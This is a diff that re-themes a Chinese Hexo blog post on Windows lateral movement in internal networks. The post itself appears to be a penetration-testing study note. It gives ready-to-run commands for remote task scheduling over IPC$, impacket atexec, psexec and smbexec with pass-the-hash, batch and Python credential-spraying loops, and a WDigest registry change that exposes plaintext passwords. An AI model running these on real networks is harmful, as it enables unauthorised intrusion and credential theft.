@@ -1,242 +1,195 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 6.1.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
 
-<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+  
+  <title>横向移动</title>
+  
+  <link rel="canonical" href="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+  
+  <meta name="description" content="at&amp;amp;schtasks在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。 获取到某域主机权限 –&amp;gt; minikatz得到密码（明文，hash）–&amp;gt; 用到信息收集里面域用户的">
+  
+  
+  <meta name="author" content="Ja1e">
+  
+  
+  
+  <meta property="og:site_name" content="Ja1e" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="横向移动" />
+  
+  <meta property="og:description" content="at&amp;amp;schtasks在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。 获取到某域主机权限 –&amp;gt; minikatz得到密码（明文，hash）–&amp;gt; 用到信息收集里面域用户的">
+  
+  <meta property="og:url" content="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" />
 
-  <meta name="description" content="横向移动by小迪">
-<meta property="og:type" content="article">
-<meta property="og:title" content="横向移动">
-<meta property="og:url" content="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
-<meta property="og:site_name" content="Ja1e">
-<meta property="og:description" content="横向移动by小迪">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-08-06T07:11:33.000Z">
-<meta property="article:modified_time" content="2022-08-18T11:28:05.608Z">
-<meta property="article:author" content="Ja1e">
-<meta name="twitter:card" content="summary">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="横向移动">
+  
+  <meta name="twitter:description" content="at&amp;amp;schtasks在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。 获取到某域主机权限 –&amp;gt; minikatz得到密码（明文，hash）–&amp;gt; 用到信息收集里面域用户的">
+  
+  
+  
+  
+  <meta name="twitter:url" content="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" />
 
-<link rel="canonical" href="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
 
-  <title>横向移动 | Ja1e</title>
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
   
 
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.png">
 
-
-
-
-
-  <noscript>
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
   <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
+  a:not(.icon) {
+    text-decoration-color: #0FA0CE;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #0FA0CE 50%
+    );
   }
+  blockquote {
+    border-left: 8px solid #0FA0CE;
+  }
+  .nanobar .bar {
+    background: #0FA0CE;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #0FA0CE;
+    border-color: #0FA0CE;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #0FA0CE;
+  }
+</style>
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
 
-</head>
+  
+  <script src="/js/pic.min.js" defer></script>
+  
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
+  
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
   </div>
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Ja1e</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">Ja1e的博客</p>
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi Folks.
+    </h1>
   </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/About" class="ml">About</a>
+          
+        
+        
+      </div>
     </div>
+    <hr style="margin-bottom: 2.6rem">
   </div>
 </div>
+<link rel="stylesheet" href="/js/prism/prism.css">
+        <div class="trans">
+            <h2>横向移动</h2>
 
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Ja1e">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ja1e">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          横向移动
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-06 15:11:33" itemprop="dateCreated datePublished" datetime="2022-08-06T15:11:33+08:00">2022-08-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-18 19:28:05" itemprop="dateModified" datetime="2022-08-18T19:28:05+08:00">2022-08-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-            <div class="post-description">横向移动by小迪</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h1 id="at-amp-schtasks"><a href="#at-amp-schtasks" class="headerlink" title="at&amp;schtasks"></a>at&amp;schtasks</h1><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
+  <h1 id="at-amp-schtasks"><a href="#at-amp-schtasks" class="headerlink" title="at&amp;schtasks"></a>at&amp;schtasks</h1><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
 <p>在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
 <p>获取到某域主机权限 –&gt; minikatz得到密码（明文，hash）–&gt; 用到信息收集里面域用户的列表做用户名字典 –&gt; 用到密码明文当做密码字典 –&gt; 尝试连接 –&gt; 创建计划任务(at|schtasks) –&gt; 执行文件（后门或命令）</p>
 <p>利用流程：</p>
@@ -246,34 +199,88 @@
 <li>查看目标时间，创建计划任务定时执行脚本</li>
 <li>删除IPC连接</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#建立IPC连接</span><br><span class="line">net use \\10.1.1.1\IPC$ &quot;passwd&quot; /user:username  #工作组</span><br><span class="line">net use \\10.1.1.1\IPC$ &quot;passwd&quot; /user:domainname\username  #域</span><br><span class="line"></span><br><span class="line">dir \\10.1.1.1\c$\					#查看文件列表</span><br><span class="line">copy \\10.1.1.1\c$\1.bat 1.bat 		#下载文件</span><br><span class="line">copy 1.bat \\10.1.1.1\c$			#上传文件</span><br><span class="line">net use \\10.1.1.1\IPC$ /del		#删除IPC连接</span><br><span class="line">net view 10.1.1.1					#查看对方共享</span><br><span class="line"></span><br><span class="line">建立IPC失败的原因：</span><br><span class="line">1. 目标系统不是NT或以上的操作系统</span><br><span class="line">2. 对方没有打开IPC$共享</span><br><span class="line">3. 对方未开启139、445端口，或者被防火墙屏蔽</span><br><span class="line">4. 账号密码错了</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#建立IPC连接
+net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:username  #工作组
+net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:domainname\username  #域
+
+dir \\10.1.1.1\c$\					#查看文件列表
+copy \\10.1.1.1\c$\1.bat 1.bat 		#下载文件
+copy 1.bat \\10.1.1.1\c$			#上传文件
+net use \\10.1.1.1\IPC$ &#x2F;del		#删除IPC连接
+net view 10.1.1.1					#查看对方共享
+
+建立IPC失败的原因：
+1. 目标系统不是NT或以上的操作系统
+2. 对方没有打开IPC$共享
+3. 对方未开启139、445端口，或者被防火墙屏蔽
+4. 账号密码错了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="at"><a href="#at" class="headerlink" title="at"></a>at</h2><p><code>&lt;Windows2012</code></p>
 <p>建立ipc连接，然后把执行文件copy上去，再使用at命令添加计划任务。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at \\10.1.1.1\ 11:30 C:\hh.bat</span><br><span class="line">at \\10.1.1.1    1 /delete</span><br><span class="line">// 1为计划任务的ID</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">at \\10.1.1.1\ 11:30 C:\hh.bat
+at \\10.1.1.1    1 &#x2F;delete
+&#x2F;&#x2F; 1为计划任务的ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><p><code>&gt;=windows2012</code></p>
 <p>建立ipc连接，然后把执行文件copy上去，再使用schtasks命令添加计划任务。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务</span><br><span class="line">schtasks /create /s 10.1.1.1 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr C:\add.bat /F</span><br><span class="line"></span><br><span class="line">#运行adduser任务</span><br><span class="line">schtasks /run /s 10.1.1.1 /tn adduser /i</span><br><span class="line"></span><br><span class="line">#删除adduser任务</span><br><span class="line">schtasks /delete /s 10.1.1.1 /tn adduser /f</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务
+schtasks &#x2F;create &#x2F;s 10.1.1.1 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr C:\add.bat &#x2F;F
+
+#运行adduser任务
+schtasks &#x2F;run &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;i
+
+#删除adduser任务
+schtasks &#x2F;delete &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="atexec-impacket"><a href="#atexec-impacket" class="headerlink" title="atexec-impacket"></a>atexec-impacket</h2><p>可以看到以上两种方法都是明文密码，但是我们信息搜集的时候可能会得到hash值，就没有办法去连接。这里使用一款工具<code>impacket</code>里的<code>atexec</code>。</p>
 <p>可以直接使用命令，但是不免杀。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe administrator:666.com@10.1.1.1 &quot;whoami&quot;</span><br><span class="line">atexec.exe ZJ/administrator:666.com@10.1.1.1 &quot;whoami&quot;</span><br><span class="line">atexec.exe -hashes :6f8a61c6702f90ae246aa2a298fcdc35333 administrator@10.1.1.1 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">atexec.exe administrator:666.com@10.1.1.1 &quot;whoami&quot;
+atexec.exe ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
+atexec.exe -hashes :6f8a61c6702f90ae246aa2a298fcdc35333 administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h2><p>俭朴版：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#扫到存活ip后保存在一个ips.txt的文件,pass.txt、hash.txt是由mimikatz来的.</span><br><span class="line"></span><br><span class="line">FOR /F %%i in (ips.txt) do net use \\%%i\IPC$ &quot;666.com&quot; /user:administrator	#变量ip</span><br><span class="line"></span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:666.com@%%i &quot;whoami&quot;	#变量ip</span><br><span class="line"></span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@10.1.1.1 &quot;whoami&quot; #变量pass</span><br><span class="line"></span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@10.1.1.1 &quot;whoami&quot; #变量hash </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#扫到存活ip后保存在一个ips.txt的文件,pass.txt、hash.txt是由mimikatz来的.
+
+FOR &#x2F;F %%i in (ips.txt) do net use \\%%i\IPC$ &quot;666.com&quot; &#x2F;user:administrator	#变量ip
+
+FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:666.com@%%i &quot;whoami&quot;	#变量ip
+
+FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%i@10.1.1.1 &quot;whoami&quot; #变量pass
+
+FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;administrator@10.1.1.1 &quot;whoami&quot; #变量hash <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>升级版：</p>
 <p>写脚本，把ip、passwd、username都变三重循环。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;10.1.1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;10.1.1.2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;jiarong.gao&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ping.fang&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passwd=&#123;</span><br><span class="line">    <span class="string">&#x27;666.com&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mima <span class="keyword">in</span> passwd:</span><br><span class="line">        	payld=<span class="string">&quot;net use \\&quot;</span>+ <span class="string">&quot;\&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:&#x27;+user</span></span><br><span class="line"><span class="string">            print(&#x27;---&gt;&#x27;+payld+&#x27;&lt;---&#x27;)</span></span><br><span class="line"><span class="string">            os.system(payld)</span></span><br><span class="line"><span class="string">            time.sleep(1)</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>time
+ips<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'10.1.1.1'</span><span class="token punctuation">,</span>
+    <span class="token string">'10.1.1.2'</span>
+<span class="token punctuation">&#125;</span>
+
+users<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'jiarong.gao'</span><span class="token punctuation">,</span>
+    <span class="token string">'ping.fang'</span>
+<span class="token punctuation">&#125;</span>
+
+passwd<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'666.com'</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> mima <span class="token keyword">in</span> passwd<span class="token punctuation">:</span>
+        	payld<span class="token operator">=</span><span class="token string">"net use \\"</span><span class="token operator">+</span> "\"<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">'\ipc$ '</span><span class="token operator">+</span>mima<span class="token operator">+</span><span class="token string">' /user:'</span><span class="token operator">+</span>user
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span><span class="token operator">+</span>payld<span class="token operator">+</span><span class="token string">'&lt;---'</span><span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>payld<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>将py文件变成exe文件：</strong></p>
 <blockquote>
@@ -291,32 +298,43 @@
 </ol>
 <p>windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows2003以后，认证方式均为NTLM Hash。</p>
 <p><strong>注册表修改</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>第一种：先建立IPC连接，再使用psexec（需要明文或hash传递）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.1.1.1\IPC$ &quot;666.com&quot; /user:administrator</span><br><span class="line">psexec \\10.1.1.1 -s cmd           #-s以System运行</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$ &quot;666.com&quot; &#x2F;user:administrator
+psexec \\10.1.1.1 -s cmd           #-s以System运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>第二种：不建立IPC连接。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">psexec \\10.1.1.1 -u administrator -p 666.com -s cmd</span><br><span class="line">psexec -hashes :$HASH$ ./administrator@10.1.1.1 </span><br><span class="line">psexec -hashes :$HASH$ domain/administrator@10.1.1.1 </span><br><span class="line">psexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ./administrator@10.1.1.1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">psexec \\10.1.1.1 -u administrator -p 666.com -s cmd
+psexec -hashes :$HASH$ .&#x2F;administrator@10.1.1.1 
+psexec -hashes :$HASH$ domain&#x2F;administrator@10.1.1.1 
+psexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>使用hashes传递时可能会出错，我们可以使用impacket工具包里的psexec，这个是基于官方的psexec二次开发的，可以进行hash的传递。但是容易被杀。</p>
 <h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><p>也是impacket工具包的一个软件。</p>
 <p>不用IPC连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbexec ZJ/administrator:666.com@10.1.1.1</span><br><span class="line">smbexec ./administrator:666.com@10.1.1.1</span><br><span class="line">smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ/administrator@10.1.1.1</span><br><span class="line">smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ./administrator@10.1.1.1</span><br></pre></td></tr></table></figure>
